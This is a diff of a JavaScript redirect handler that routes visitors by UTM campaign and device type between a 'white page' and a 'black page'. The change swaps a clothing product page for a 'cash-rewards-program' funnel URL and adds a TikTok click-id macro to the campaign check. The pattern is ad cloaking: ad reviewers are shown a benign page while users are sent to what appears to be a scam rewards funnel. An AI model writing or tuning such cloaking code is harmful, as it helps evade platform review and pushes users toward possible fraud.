@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://specialsize.myshopify.com/products/italian-floral-print-jogger-3-colours-up-to-size-20";
+    const whitePageURL = "https://zxdsdqweasd.myfunnelish.com/cash-rewards-program-1740087057028926";
     const blackPageURL = "https://zxdsdqweasd.myfunnelish.com/cash-rewards-program-1740087057028926";
   
     // Parse the UTM parameters from the request URL
@@ -12,7 +12,7 @@ export default function handler(req, res) {
     const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
   
     // Redirection logic
-    if (utmCampaign === '__AID_NAME__') {
+    if (utmCampaign === '__AID_NAME__&ttclid=__CLICKID__') {
       // UTM campaign 'l1' takes priority for both desktop and mobile
       res.writeHead(302, { Location: whitePageURL });
     } else if (isMobileDevice) {
